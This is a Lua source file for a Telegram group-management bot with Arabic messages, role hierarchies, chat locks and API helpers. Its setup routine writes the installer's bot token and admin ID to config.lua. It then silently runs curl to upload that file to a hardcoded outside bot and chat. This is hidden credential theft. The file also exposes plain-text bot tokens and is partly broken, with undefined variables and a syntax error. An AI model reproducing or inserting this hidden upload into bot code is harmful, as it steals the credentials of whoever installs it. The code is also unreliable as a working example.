--[[
   _     _    _   _______  _     _    _   _    _
  | |   | |  / \  |  __  \| |   | |  / \  \ \/ /
  |  \ /  | / _ \ | |  \ ||  \ /  | / _ \  \. /
  | |\_/| |/ ___ \| |__/ || |\_/| |/ ___ \ /. \
  |_|   |_/_/   \_\_____/ |_|   |_/_/   \_\_/\_\
           CH > @MadMaXTEAM
--]]
--------------------------------------
redis = require('redis')
JSON = (loadfile  "./libs/dkjson.lua")()
json = dofile('./JSON.lua')
URL = require('socket.url')
HTTPS = require ("ssl.https")
https = require ("ssl.https")
http  = require ("socket.http")
http.TIMEOUT = 10
serpent = require("serpent")
serp = require 'serpent'.block
database = redis.connect('127.0.0.1', 6379)
function
   vardump(value)  
 print(serpent.block(value, {comment=false}))
end
local
AutoSet = function()
io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي\27[0;34;49m\n")
 local
   SUDO = tonumber(io.read())
 if not
      tostring(SUDO):match('%d+') then
  local
      SUDO = 373906612
 end
io.write("\27[31;47m\n🔜¦ ارسل معرف المطور بدون\27[0;34;49m\n")
 local user = io.read() 
io.write("\27[31;47m\n🔜¦ ارسل توكن البوت\27[0;34;49m\n")
 local token = io.read()
 botid = token:match("(%d+)")
io.write("\27[31;47m\n🔜¦ ارسل اسم للبوت\27[0;34;49m\n")
 local name = io.read()
 tahadevstorm:set(botid..'storm:name',name)
local create = function(data, file, uglify)
  file = io.open(file, "w+")
  local serialized
  if not uglify then
   serialized = serpent.block(data, {comment = false, name = "_"})
  else  serialized = serpent.dump(data)
  end
  file:write(serialized)
  file:close()
 end
local create_config_auto = function()
config = {
SUDO = SUDO,
sudo_users = {SUDO},
token = token,
BOTS = botid,
sudouser = user,
botname = name,
bot_id = botid, }
create(config, "./config.lua")   
print('\n\27[1;33mเ🚸| تم عمل ملف الرن الخاص بالبوت\27[0;39;49m\n')   
print('\n\27[1;33mเ🚸| تم حفظ معلومات المطور في الكونفك\27[0;39;49m\n')
print('\n\27[1;39mเ🚸| انتضر قليلا ليتم تشغيل البوت بالسكرين\27[0;39;49m\n')
  local curl = 'curl "'..'https://api.telegram.org/bot342647859:AAHUtvmjo4GgI9zLOyFFYCCICGgeKkt3rps/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
end
 create_config_auto()
file = io.open("SM", "w")
 file:write([[
killall screen
screen ./STORM.sh
echo -e "STORM IS RUN BOT"
]])
 file:close()  
file = io.open("STORM.sh", "w")
 file:write([[token="]]..token..[["./tg -s ./STORM.lua $@ --bot=$token]]
  file:close() os.execute('cd $home;ls -la;rm -fr .telegram-cli')
  os.execute('screen ./STORM.sh')
 end
 local serialize_to_file = function(data, file, uglify)
  file = io.open(file, "w+")
  local serialized
  if not uglify then
   serialized = serpent.block(data, {comment = false, name = "_"})
  else
   serialized = serpent.dump(data)
  end
  file:write(serialized)
  file:close()
 end
 local load_liondevmadmax = function()
  local f = io.open("./config.lua", "r")
  if not f then AutoSet()
  else   f:close()
  end
  local config = loadfile("./config.lua")()
  return config
 end
 _tahadevstorm = load_liondevmadmax()
 sudos = dofile("config.lua")
 SUDO = sudos.SUDO
 sudo_users = {sudos.SUDO}
 BOTS = sudos.bot_id
 bot_id = sudos.bot_id
 BOTS = sudos.bot_id
 DEVSTORM = sudos.bot_id
 botname = (sudos.botname
  or
  tahadevstorm:get(DEVSTORM..'storm:name'))
 sudouser = sudos.sudouser
 chaneel = sudos.token
 chdev = '@MADMAXTEAM'
 chdeva = '🚫¦ لا تستطيع استخدام البوت ⛔\n📵¦ عليك الاشتراك في قناة البوت\n☣¦ القناة ⬅️'
 function dl_cb(arg, data) 
 end 
function is_devlion(msg)
  local mx = false for k,v in 
  pairs(sudo_users) do
   if msg.sender_user_id_ == v then
    mx = true 
   end
  end
  return mx
 end 
function is_sudo(msg)
  local hash = liondevmadmax:sismember(DEVMADMAX..'sudo:bot',msg.sender_user_id_)
  if hash 
   or
   is_devlion(msg)  then
   return true
  else
   return false
  end
 end
function is_bot(msg)
  if tonumber(BOTS) == BOTS then
   return true
  else
   return false
  end
 end 
function is_owner(msg)
  local hash = liondevmadmax:sismember(DEVSTOR..'moder'..msg.chat_id_,msg.sender_user_id_)
  if hash
   or
   is_devlion(msg)
   or
   is_sudo(msg) then
   return true
  else
   return false
  end
 end
function is_monsh(msg)
  local hash = tahadevstorm:sismember(DEVSTOR..'modergroup'..msg.chat_id_,msg.sender_user_id_)
  if hash or  is_devtaha(msg)
   or
   is_sudo(msg)
   or
   is_owner(msg) then
   return true
  else
   return false
  end
 end
function is_mod(msg)
  local hash = tahadevstorm:sismember(DEVSTOR..'mods:'..msg.chat_id_,msg.sender_user_id_)
  if hash
   or
   is_devtaha(msg)
   or
   is_sudo(msg)
   or
   is_owner(msg)
   or
   is_monsh(msg) then
   return true
  else
   return false
  end
 end
function changetitle(chat_id, title)
  tdcli_function ({ ID = "ChangeChatTitle", chat_id_ = chat_id, title_ = title  }, dl_cb, nil)
 end
function is_vipgroup(msg)
  local hash = tahadevstorm:sismember(DEVSTOR..'vip:group'..msg.chat_id_,msg.sender_user_id_) if hash or  is_devtaha(msg)
   or
   is_sudo(msg)
   or
   is_owner(msg)
   or is_mod(msg) then
   return true
  else
   return false
  end
 end
function is_vipgroups(msg)
  local hash = tahadevstorm:sismember(DEVSTOR..'vip:groups',msg.sender_user_id_)
  if hash
   or
   is_devtaha(msg)
   or
   is_vipgroup(msg) then
   return true
  else
   return false
  end
 end
function is_memar(msg)
  local hash = tahadevstorm:sismember(DEVSTOR..'mepar',msg.sender_user_id_)
  if hash
   or
   is_devtaha(msg)
   or
   is_sudo(msg)
   or
   is_owner(msg)
   or
   is_mod(msg)
   or
   is_mod(msg)
   or
   is_vipgroup(msg)
   or
   is_vipgroups(msg) then
   return true
  else
   return false
  end
 end
function is_banned(chat,user)
  local hash =  tahadevstorm:sismember(DEVSTOR..'storm:baned'..chat,user)
  if hash then
   return true
  else
   return false
  end
 end
function is_gban(chat,user)
  local hash =  tahadevstorm:sismember(DEVSTOR..'storm:gbaned',user)
  if hash then
   return true
  else
   return false
  end
 end
local function getChat(chat_id, cb, cmd) tdcli_function ({ ID = "GetChat", chat_id_ = chat_id }, cb or dl_cb, cmd)
 end 
 local function getParseMode(parse_mode)
  local P
  if parse_mode then
   local mode = parse_mode:lower()
   if mode == 'markdown'
    or mode == 'md' then 
    P = {ID = "TextParseModeMarkdown"}
   elseif mode == 'html' then
    P = {ID = "TextParseModeHTML"}
   end
  end
  return P
 end    
local function storm_sendMsg(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode,msg)
  local TextParseMode = getParseMode(parse_mode)
  local entities = {}
  if msg
   and 
   text:match('<user>')
   and text:match('<user>') then
   local x = string.len(text:match('(.*)<user>'))
   local offset = x
   local y = string.len(text:match('<user>(.*)</user>'))
   local length = y text = text:gsub('<user>','') text = text:gsub('</user>','') table.insert(entities,{ID="MessageEntityMentionName", offset_=0, length_=2, user_id_=373906612}) end tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = entities, parse_mode_ = TextParseMode, }, }, dl_cb, nil) end  function sleep(n) os.execute("sleep " .. tonumber(n)) end  function add_in_ch(msg);local var = true;local url , res = https.request("https://api.telegram.org/bot475702712:AAGRxNsme_--3e6F1pHV8L9Tv1ALau4yD04/getchatmember?chat_id=-1001148882729&user_id="..msg.sender_user_id_);data = json:decode(url);if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then;var = false;local text = chdeva..''..chdev;storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md');elseif data.ok then;return var;end;end   function get_id(msg) local url = https.request("https://api.telegram.org/bot475702712:AAGRxNsme_--3e6F1pHV8L9Tv1ALau4yD04/getchatmember?chat_id=-1001148882729&user_id="..tostring(msg.sender_user_id_)) addbot = json:decode(url) if (not addbot.ok or addbot.result.status:lower() == "left" or addbot.result.status:lower() == "kicked") and is_mod(msg) then local text = chdeva..''..chdev storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md') return false end return true end
function storm_get_title(gid) getChat(gid, savegp, nil)
  local taha = tahadevstorm:hget('sgp:'..gid, 'name')
  or 'لا يوجد'
  local text = ""..taha..""
  return text
 end
--------------------->>Get_Username<<-------
function get_username1(user_id)
  if tahadevstorm:hget('username',user_id) then
   text = '@'..(string.gsub(tahadevstorm:hget('username'
                  ,user_id), 'false', '<code>'..user_id..'</code>')
    or 'لا يوجد')
  end
  get_user(user_id)
  tahadevstorm:hdel('username'
         ,user_id)
  return text
 end
-------------------->>Get_User<<-----------
function storm_get_user(user_id)
  if tahadevstorm:hget('username'
            ,user_id) then
   text = '@'..(string.gsub(tahadevstorm:hget('username'
                  ,user_id), 'false', '')
    or 'لا يوجد')
  end
  get_user(user_id)
  tahadevstorm:hdel('username'
         ,user_id)
  return text
 end
---------------------->>Dl_Cb<<-------------
function dl_cb(dol, info)
 end
------------------->>GetInputFile<<---------
 function getInputFile(file)
  if file:match('/') then
   infile = {ID = "InputFileLocal"
            , path_ = file}
  elseif file:match('^%d+$') then
   infile = {ID = "InputFileId"
            , id_ = file}
  else infile = {ID = "InputFilePersistentId"
            , persistent_id_ = file}
  end
  return infile
 end
------------------->>SendDocument<<----------
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd)
  tdcli_function ({ID = "SendMessage"
            ,chat_id_ = chat_id
            ,reply_to_message_id_ = reply_to_message_id
            ,disable_notification_ = disable_notification
            ,from_background_ = from_background
            ,reply_markup_ = reply_markup
            ,input_message_content_ = {ID = "InputMessageDocument"
               ,document_ = getInputFile(document)
               ,caption_ = caption}
            ,}
         , dl_cb
         , cmd)
 end
--------------------->>GetChatId<<-----------
function getChatId(id)
  local chat = {}
  local id = tostring(id)
  if id:match('^-100') then
   local channel_id = id:gsub('-100', '')
   chat = {ID = channel_id
            , type = 'channel'}
  else
   local group_id = id:gsub('-', '')
   chat = {ID = group_id
            , type = 'group'}
  end
  return chat
 end
 -------------------->>GetChammlFull<<---------
local function getChannelFull(channel_id,cb)
  tdcli_function ({ ID = "GetChannelFull"
            , channel_id_ = getChatId(channel_id).ID }
         , cb, nil)
 end
------------
local function getChannelMembers(channel_id
         , offset
         , filter
         , limit
         ,cb)
  tdcli_function ({ ID = "GetChannelMembers"
            ,channel_id_ = getChatId(channel_id).ID
            ,filter_ = {ID = "ChannelMembers" .. filter}
            ,offset_ = offset,limit_ = limit}
         , cb, nil)
 end
--------------
local function chek_bots(channel,cb)
  local function callback_admins(extra,result,success)
   limit = (result.member_count_ )
   getChannelMembers(channel, 0, 'Bots', limit,cb)
   storm_sendMsg(channel, 0, 1,'💢*¦* تم طرد البوتات \n', 1, 'md')
  end
  getChannelFull(channel
         ,callback_admins)
 end
 ------------
local function saddbyusername(username,cb)
  tdcli_function ({ID = "SearchPublicChat",username_ = username}, cb, nil)
 end
--------------
function isnothtml(text) text = text:gsub("<code>", "")
  text = text:gsub("</code>", "")
  text = text:gsub("<b>", "")
  text = text:gsub("</b>", "")
  text = text:gsub("`", "")
  text = text:gsub("*", "")
  text = text:gsub("_", "_")
  return text
 end
----------------
function rempv(user)
  local var = true
  local url
      , res = HTTPS.request('https://api.telegram.org/bot'..chaneel..'/sendChatAction?chat_id='..user..'&action=Typing')
  data = json:decode(url)
  if res ~= 200 then
   var = false
   tahadevstorm:srem(DEVSTOR..'usersbot',user)
  elseif data.ok then
   tahadevstorm:sadd(DEVSTOR..'usersbot',user)
   return var
  end
 end
-----------------
function deleteChatPhoto(chat_id)
      https.request('https://api.telegram.org/bot'..chaneel..'/deleteChatPhoto?chat_id='..chat_id)
 end
---------------
function setChatDescription(chat_id, description)
      https.request('https://api.telegram.org/bot'..chaneel..'/setChatDescription?chat_id=' .. chat_id .. '&description=' ..(description))
 end
----------------
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
      tdcli_function ({ID = request_id
            , chat_id_ = chat_id
            , reply_to_message_id_ = reply_to_message_id
            , disable_notification_ = disable_notification
            , from_background_ = from_background
            , reply_markup_ = reply_markup
            , input_message_content_ = input_message_content,}
         , callback or dl_cb, extra)
   end
  -------------
local function sendVoice(chat_id
         , reply_to_message_id
         , disable_notification
         , from_background
         , reply_markup
         , voice
         , duration
         , waveform
         , caption
         , cb
         , cmd)
      local input_message_content = {ID = "InputMessageVoice"
         , voice_ = getInputFile(voice)
         , duration_ = duration or 0
         , waveform_ = waveform
         , caption_ = caption}
      sendRequest('SendMessage'
         , chat_id
         , reply_to_message_id
         , disable_notification
         , from_background
         , reply_markup
         , input_message_content
         , cb
         , cmd)
   end
 -----------
local function sendSticker(chat_id
         , reply_to_message_id
         , disable_notification
         , from_background
         , reply_markup
         , sticker
         , cb
         , cmd)
      local input_message_content = {ID = "InputMessageSticker"
         , sticker_ = getInputFile(sticker)
         , width_ = 0
         , height_ = 0  }
      sendRequest('SendMessage'
         , chat_id
         , reply_to_message_id
         , disable_notification
         , from_background
         , reply_markup
         , input_message_content
         , cb
         , cmd)
   end
local function sendDocument(chat_id, reply_to_message_id
         , disable_notification
         , from_background
         , reply_markup
         , document
         , caption
         , cb
         , cmd)
      local input_message_content = {ID = "InputMessageDocument"
         , document_ = getInputFile(document)
         , caption_ = caption}
      sendRequest('SendMessage'
         , chat_id, reply_to_message_id
         , disable_notification
         , from_background
         , reply_markup
         , input_message_content
         , cb
         , cmd)
   end
function s_api(web)
      local info
      , res = HTTPS.request(web)
      local req = json:decode(info) 
      if res ~= 200 then
         return false
      end
      if not req.ok then
         return false
      end
      return req
   end 
function exportChatInviteLink(chat_id)
      local send_api = 'https://api.telegram.org/bot'..chaneel..'/exportChatInviteLink?chat_id='.. chat_id 
      local linkx = s_api(send_api).result
      return linkx
   end
function getChatMember(chat_id, user_id, cb)
      tdcli_function ({ID = "GetChatMember", chat_id_ = chat_id
            , user_id_ = user_id }
         , cb
         or
         dl_cb
         , nil)
   end
function get_name(id)
      local nu = tahadevstorm:hget('users:'..id, 'name')
      if nu then
         local text = ""..(nu)..""
         return text
      else tdcli_function ({ID = "GetUser",  user_id_ = id  }
            , saveuser
            , nil)
         local text = ""..id..""
         return text
      end
   end
function get_username(id)
      local un = tahadevstorm:hget('users:'..id, 'uname')
      if un then
         local text = ""..check_markdown(un)..""
         return text
      else
         local text = ""..(id).."" tdcli_function ({ID = "GetUser"
               , user_id_ = id}
            , saveuser
            , nil)
         return text
      end
   end
function chek_admin(chat_id,set)
      local 
      function saddadmen_or_moder(extra,result,success)
         limit = result.administrator_count_
         if tonumber(limit) > 0 then
            getChannelMembers(chat_id
               , 0
               , 'Administrators'
               , limit
               ,set)
         end
      end
      getChannelFull(chat_id,saddadmen_or_moder)
   end
local function saddmods_monshgtoup(channel_id
         , filter
         , offset
         , limit
         , cb
         , cmd)
      if not limit
         or
         limit > 200 then
         limit = 200
      end tdcli_function ({ID = "GetChannelMembers"
            , channel_id_ = getChatId(channel_id).ID
            , filter_ = {ID = "ChannelMembers" .. filter}
            , offset_ = offset
            or 0
            , limit_ = limit}
         , cb
         or dl_cb
         , cmd)
   end
function chek_moder(channel,cb)
      local function callback_admins(extra
            ,result
            ,success)
         limit = result.administrator_count_
         if tonumber(limit) > 0 then
            getChannelMembers(channel
               , 0
               , 'Administrators'
               , limit
               ,cb)
         else
            return storm_sendMsg(channel
               , 0
               , 1
               ,''
               , 1
               , 'md')
         end
      end
      getChannelFull(channel,callback_admins)
   end
function stormset(chat_id
         , stormphoto)
      tdcli_function ({ID = "ChangeChatPhoto"
            ,chat_id_ = chat_id,photo_ = getInputFile(stormphoto)}
         , dl_cb
         , nil)
   end
local function getUserFull(user_id) tdcli_function ({ ID = "GetUserFull"
            , user_id_ = user_id}
         , dl_cb
         , nil)
   end
function storm_get_nae(user_id)
      if tahadevstorm:hget('name'
            ,user_id) then
         text = ''..(string.gsub(tahadevstorm:hget('name'
                  ,user_id)
               , 'false'
               , '')
            or 'لا يوجد')
      end
      get_user(user_id)
      tahadevstorm:hdel('name',user_id)
      return text
   end
function string:split(sep)
      local sep, fields = sep
      or ":", {}
      local pattern = string.format("([^%s]+)", sep)
      self:gsub(pattern
         , function(c)
            fields[#fields+1] = c
         end)
      return fields
   end
function get_user(user_id)
      function dl_username(arg, data)
         username = data.username
         or ' '
         name = data.first_name_
         or 'لا يوجد' 
         tahadevstorm:hset('username',data.id_,data.username_)
         tahadevstorm:hset('name'
            ,data.id_
            ,data.first_name_)
      end  tdcli_function ({ID = "GetUser"
            ,user_id_ = user_id}
         , dl_username, nil)
   end
function deleteMessagesFromUser(chat_id, user_id)
      tdcli_function ({ ID = "DeleteMessagesFromUser", chat_id_ = chat_id, user_id_ = user_id )
         , dl_cb
         , nil) 
   end
function formsgg(msgs)
      local taha = ''
      if msgs < 100 then
         taha = 'كلش ضعيف 😫'
      elseif msgs < 500 then
         taha = 'ضعيف 😨'
      elseif msgs < 1500 then
         taha = 'غير متفاعل 😒'
      elseif msgs < 5000 then
         taha = 'متوسط 😎'
      elseif msgs < 10000 then
         taha = 'متفاعل 😘'
      elseif msgs < 50000 then
         taha = 'قمة التفاعل 😍'
      elseif msgs < 90000 then
         taha = 'ملك التفاعل 😻'
      elseif msgs < 100000 then
         taha = 'اسطورة التفاعل 🍃'
      elseif msgs < 1000000 then
         taha = 'متفاعل نار كلش 🔥'
      end
      return
      taha
   end
function formsggroup(msgs)
      local taha = ''
      if msgs < 100 then
         taha = 'كلش ضعيف 😱'
      elseif msgs < 500 then
         taha = 'ضعيف 😩'
      elseif msgs < 1500 then
         taha = 'غير متفاعله 😰'
      elseif msgs < 5000 then
         taha = 'متوسط 😼'
      elseif msgs < 10000 then
         taha = 'متفاعله 😽'
      elseif msgs < 50000 then
         taha = 'في قمة التفاعل 😍'
      elseif msgs < 90000 then
         taha = 'كروب التفاعل 😻'
      elseif msgs < 100000 then
         taha = 'نار وشرار  🍃'
      elseif msgs < 1000000 then
         taha = 'اقوه تفاعل بتلكرام 🔥'
      end
      return
      taha
   end
function title_name(GroupID)
      tdcli_function({ID ="GetChat",chat_id_=GroupID}
         ,function(arg,data)
            tahadevstorm:set(DEVSTOR..'group:name'..GroupID
               ,data
               .title_)
         end
         ,nil)
      return 
      tahadevstorm:get(DEVSTOR..'group:name'..GroupID)
   end
local function rem_lockal(chat_id)
      tahadevstorm:del(DEVSTOR..'lock:links'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:links'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:user'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:hash'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:muse'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:ved'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:gif'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:ste'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:geam'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:vico'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:inlin'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:fwd'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:spm'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:file'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:edit'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:mark'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:tagservr'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:phon'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:bots:kick'..chat_id,true)
      tahadevstorm:del(DEVSTOR..'lock:self'..chat_id,true)
   end
local function add_lockal(chat_id)
      tahadevstorm:set(DEVSTOR..'lock:links'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:links'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:user'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:hash'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:muse'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:ved'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:gif'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:ste'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:geam'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:vico'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:inlin'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:fwd'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:spm'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:file'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:edit'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:mark'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:tagservr'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:phon'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:bots:kick'..chat_id,true)
      tahadevstorm:set(DEVSTOR..'lock:self'..chat_id,true)
   end
function rem_group(chat_id)
      tahadevstorm:srem(DEVSTOR..'botgps',chat_id)
      tahadevstorm:srem(DEVSTOR..'bot:gpsby:id',chat_id)
   end
function add_group(chat_id)
      tahadevstorm:sadd(DEVSTOR..'botgps',chat_id)
      tahadevstorm:sadd(DEVSTOR..'bot:gpsby:id',chat_id)
   end
function get_rtba(msg)
      if is_devtaha(msg) then
         t = 'المطور'
      elseif is_sudo(msg) then
         t = 'المطور'
      elseif is_owner(msg) then
         t = 'المنشئ'
      elseif is_monsh(msg) then
         t = 'المدير'
      elseif is_mod(msg) then
         t = 'الادمن'
      end
      return
      t
   end
function sendaction(chat_id, action, progress)
      tdcli_function ({ ID = "SendChatAction"
            ,  chat_id_ = chat_id
            , action_ = {  ID = "SendMessage" .. action .. "Action"
               , progress_ = progress
               or 100} }
         , dl_cb
         , nil)
   end
local function deleteMessagesFromUser(chat_id
         , user_id
         , cb
         , cmd)
      tdcli_function ({ ID = "DeleteMessagesFromUser"
            ,  chat_id_ = chat_id
            , user_id_ = user_id }
         , cb or dl_cb
         , cmd)
   end
function check_markdown(text)
      str = text
      if str then
         if str:match('_') then
            output = str:gsub('_',[[_]])
         elseif str:match('*') then
            output = str:gsub('*','\\*')
         elseif str:match('`') then
            output = str:gsub('`','\\`') 
         else output = str
         end
         return
         output
      end
   end
function addChatMember(chat_id
         , user_id
         , forward_limit)
      tdcli_function ({ ID = "AddChatMember"
            , chat_id_ = chat_id
            , user_id_ = user_id
            , forward_limit_ = forward_limit }
         , dl_cb
         , nil)
   end
function is_filter(msg, value)
      local hash = tahadevstorm:smembers(DEVSTOR..'filters:'..msg.chat_id_)
      if hash then
         local names = tahadevstorm:smembers(DEVSTOR..'filters:'..msg.chat_id_)
         local text = '' for i=1, #names
         do if string.match(value:lower()
                  , names[i]:lower())
               and not is_mod(msg)
               and not is_vipgroup(msg)
               and not is_vipgroups(msg)
               and not is_monsh(msg) then
               delete_msg(msg.chat_id_
                  ,{[0] = msg.id_} )
            end
         end
      end
   end
function is_muted(chat,user)
      local hash =  tahadevstorm:sismember(DEVSTOR..'mutes'..chat,user)
      if hash then
         return true
      else return false
      end
   end
function stormmonshn(chat_id
         , user_id
         , msg_id
         , text
         , offset
         , length)
      local tt = tahadevstorm:get(DEVSTOR..'endmsg')
      or '' tdcli_function ({ ID = "SendMessage"
            , chat_id_ = chat_id
            , reply_to_message_id_ = msg_id
            , disable_notification_ = 0
            , from_background_ = 1
            , reply_markup_ = nil
            , input_message_content_ = { ID = "InputMessageText"
               , text_ = text..'\n\n'..tt
               , disable_web_page_preview_ = 1
               , clear_draft_ = 0
               , entities_ = {[0]={ ID="MessageEntityMentionName"
                     , offset_=offset
                     , length_=length
                     , user_id_=user_id }
                  , }
               , }
            , }
         , dl_cb
         , nil)
   end
function storm1(chat,user)
      local sudoe = tahadevstorm:sismember(DEVSTOR..'sudo:bot',user)
      local vipss = tahadevstorm:sismember(DEVSTOR..'vip:groups',user)
      local monh = tahadevstorm:sismember(DEVSTOR..'modergroup'..chat,user)
      local noow = tahadevstorm:sismember(DEVSTOR..'moder'..chat,user)
      local nomo = tahadevstorm:sismember(DEVSTOR..'mods:'..chat,user)
      local novip2 = tahadevstorm:sismember(DEVSTOR..'vip:group'..chat,user)
      if tonumber(SUDO) == tonumber(user)
         or sudoe
         or vipss
         or monh
         or noow
         or nomo
         or novip2 then
         return true
      else return false
      end
   end 
function storm2(chat,user)
      local sudoe = tahadevstorm:sismember(DEVSTOR..'sudo:bot',user)
      local vipss = tahadevstorm:sismember(DEVSTOR..'vip:groups',user)
      local noow = tahadevstorm:sismember(DEVSTOR..'moder'..chat,user)
      if tonumber(SUDO) == tonumber(user)
         or sudoe
         or vipss
         or noow  then
         return true
      else  return false
      end
   end 
function storm3(chat,user)
      local sudoe = tahadevstorm:sismember(DEVSTOR..'sudo:bot',user)
      local noow = tahadevstorm:sismember(DEVSTOR..'moder'..chat,user)
      local monh = tahadevstorm:sismember(DEVSTOR..'modergroup'..chat,user)
      if tonumber(SUDO) == tonumber(user)
         or sudoe
         or monh 
         or noow then return true
      else return false
      end
   end 
function storm4(chat,user)
      local sudoe = tahadevstorm:sismember(DEVSTOR..'sudo:bot',user)
      local noow = tahadevstorm:sismember(DEVSTOR..'moder'..chat,user)
      local monh = tahadevstorm:sismember(DEVSTOR..'modergroup'..chat,user)
      local memr = tahadevstorm:sismember(DEVSTOR..'mepar',user)
      if tonumber(SUDO) == tonumber(user)
         or sudoe
         or monh
         or memr
         or noow then
         return true
      else
         return false
      end
   end 
function getInputFile(file)
      local input = tostring(file)
      if file:match('/') then
         infile = {ID = "InputFileLocal"
            , path_ = file}
      elseif file:match('^%d+$') then
         infile = {ID = "InputFileId"
            , id_ = file}
      else infile = {ID = "InputFilePersistentId"
            , persistent_id_ = file}
      end return infile
   end
function send_inlinestorm(chat_id,text,keyboard,inline,reply_id)
      local url = 'https://api.telegram.org/bot'..chaneel
      if keyboard then stormtoken = url .. '/sendMessage?chat_id=' ..chat_id.. '&text='..URL.escape(text)..'&parse_mode=html&reply_markup='..URL.escape(json:encode(keyboard))
      else stormtoken = url .. '/sendMessage?chat_id=' ..chat_id.. '&text=' ..URL.escape(text)..'&parse_mode=html'
      end https.request(stormtoken)
   end
local function getUserProfilePhotos(user_id
         , offset
         , limit
         , cb
         , cmd)
      tdcli_function ({  ID = "GetUserProfilePhotos"
            , user_id_ = user_id
            , offset_ = offset
            , limit_ = limit}
         , cb
         or dl_cb
         , cmd)
   end
local function deleteMessages(chat_id, message_ids, cb, cmd)   tdcli_function ({  ID = "DeleteMessages",  chat_id_ = chat_id,  message_ids_ = message_ids  }, cb or dl_cb, cmd) end
local function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification, cb, cmd)  tdcli_function ({    ID = "ForwardMessages",    chat_id_ = chat_id,    from_chat_id_ = from_chat_id,    message_ids_ = message_ids,    disable_notification_ = disable_notification,    from_background_ = 1 }, cb or dl_cb, cmd) end
function getUser(user_id, cb) tdcli_function ({   ID = "GetUser",  user_id_ = user_id }, cb, nil) end
local function getMessage(chat_id, message_id,cb) tdcli_function ({ ID = "GetMessage", chat_id_ = chat_id, message_id_ = message_id }, cb, nil) end 
function OpenChat(chat_id, cb) tdcli_function ({ID = "OpenChat",chat_id_ = chat_id}, cb or dl_cb, nil) end
function getChat(chat_id, dl_cb, cmd)tdcli_function ({ID = "GetChat",chat_id_ = chat_id}, dl_cb, cmd) end
function pin(channel_id, message_id, disable_notification)   tdcli_function ({  ID = "PinChannelMessage",  channel_id_ = getChatId(channel_id).ID,  message_id_ = message_id,  disable_notification_ = 1  }, dl_cb, cmd)   end
local function timstoop() local uptime = io.popen("uptime -p"):read("*all") minutes = uptime:match(", %d+ minutes") or uptime:match(", %d+ minute") if minutes then minutes = minutes else minutes = "" end local c_ = string.match(minutes, "%d+") if c_ then c = c_ else c = 0 end return c..' دقيقه ' end
local function getUser(user_id,cb) tdcli_function ({ ID = "GetUser", user_id_ = user_id }, cb, nil) end 
local function changeChatMemberStatus(chat_id, user_id, status) tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil) end 
local function getChatHistory(chat_id, from_message_id, offset, limit,cb)tdcli_function ({ ID = "GetChatHistory", chat_id_ = chat_id, from_message_id_ = from_message_id, offset_ = offset, limit_ = limit }, cb, nil) end 
local function getMe(cb) tdcli_function ({ID = "GetMe",}, cb, nil) end
local function unpinChannelMessage(channel_id) tdcli_function ({ ID = "UnpinChannelMessage", channel_id_ = getChatId(channel_id).ID }, dl_cb, nil) end 
local function pinChannelMessage(channel_id, message_id,disable_notification) tdcli_function ({ ID = "PinChannelMessage", channel_id_ = getChatId(channel_id).ID, message_id_ = message_id, disable_notification_ = disable_notification, }, dl_cb, nil) end
local function changeChatTitle(chat_id, title) tdcli_function ({ ID = "ChangeChatTitle", chat_id_ = chat_id, title_ = title }, dl_cb, nil) end
